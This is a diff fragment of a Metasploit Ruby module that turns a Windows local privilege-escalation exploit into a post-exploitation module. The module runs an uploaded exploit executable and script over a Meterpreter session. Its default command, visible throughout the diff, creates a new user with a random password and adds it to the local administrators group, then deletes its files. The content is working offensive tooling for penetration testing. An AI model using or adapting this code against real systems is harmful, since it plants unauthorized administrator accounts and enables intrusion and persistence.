@@ -5,13 +5,11 @@
 require 'msf/core/post/common'
 require 'msf/core/post/file'
 require 'msf/core/post/windows/priv'
-require 'msf/core/exploit/exe'
 
-class MetasploitModule < Msf::Exploit::Local
-  Rank = ExcellentRanking
+class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::File
-  include Msf::Post::Windows::Priv
+#  include Msf::Post::Windows::Priv
 
   def initialize(info = {})
     super(update_info(info,
@@ -58,7 +56,6 @@ class MetasploitModule < Msf::Exploit::Local
   def setup
     super
     validate_active_host
-    @cmd_to_run = datastore['COMMAND']
     @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
     @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
     @exploit_name = "#{exploit_name}.exe" unless exploit_name.match(/\.exe$/i)
@@ -73,16 +70,14 @@ class MetasploitModule < Msf::Exploit::Local
     password = Rex::Text.rand_text_alpha((rand(8) + 6))
     print_status("username = #{username}, password = #{password}")
     cmd_to_run = 'net user /add ' + username + ' ' + password
-    cmd_to_run += '  > C:\\\\Windows\\\\Temp\\\\testoutput.txt'
     cmd_to_run += '  & net localgroup administrators /add ' + username
-    cmd_to_run += '  >> C:\\\\Windows\\\\Temp\\\\testoutput.txt'
     print_status(cmd_to_run)
     return cmd_to_run
   end
 
   def validate_active_host
     begin
-      print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
+      print_status("Attempting to Run on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
     rescue Rex::Post::Meterpreter::RequestError => e
       elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
       raise Msf::Exploit::Failed, 'Could not connect to session'
@@ -129,7 +124,7 @@ class MetasploitModule < Msf::Exploit::Local
     script_template_data = ::IO.read(local_script_template_path)
     vprint_status("script_template_data.length =  #{script_template_data.length}")
     full_command = 'cmd.exe /c ' + cmd_to_run
-    full_command = cmd_to_run
+    full_command = full_command
     script_data = script_template_data.sub!('SCRIPTED_COMMAND', full_command)
     if script_data == nil
       fail_with(Failure::BadConfig, "Failed to substitute command in script_template")
@@ -139,9 +134,11 @@ class MetasploitModule < Msf::Exploit::Local
     vprint_status('Script uploaded successfully')
   end
 
-  def exploit
-    if cmd_to_run.nil?
+  def run
+    if datastore['COMMAND'].nil?
       cmd_to_run = populate_command
+    else
+      cmd_to_run = datastore['COMMAND']
     end
     print_status("exploit path is: #{exploit_path}")
     print_status("script path is: #{script_path}")
@@ -159,20 +156,18 @@ class MetasploitModule < Msf::Exploit::Local
       vprint_status('Launching Exploit...')
       command_output = cmd_exec(exploit_path + ' ' + script_path)
       vprint_status(command_output)
-      print_good('Exploit completed, wait for elevated session')
+      print_good('Exploit Completed')
       ensure_clean_destination(exploit_path)
-#      ensure_clean_destination(script_path)
+      ensure_clean_destination(script_path)
     rescue Rex::Post::Meterpreter::RequestError => e
       elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
       print_good('Command failed, cleaning up')
       print_error(e.message)
       ensure_clean_destination(exploit_path)
-#      ensure_clean_destination(script_path)
+      ensure_clean_destination(script_path)
     end
   end
-
   attr_reader :exploit_name
-  attr_reader :cmd_to_run
   attr_reader :script_name
   attr_reader :temp_path
   attr_reader :exploit_path
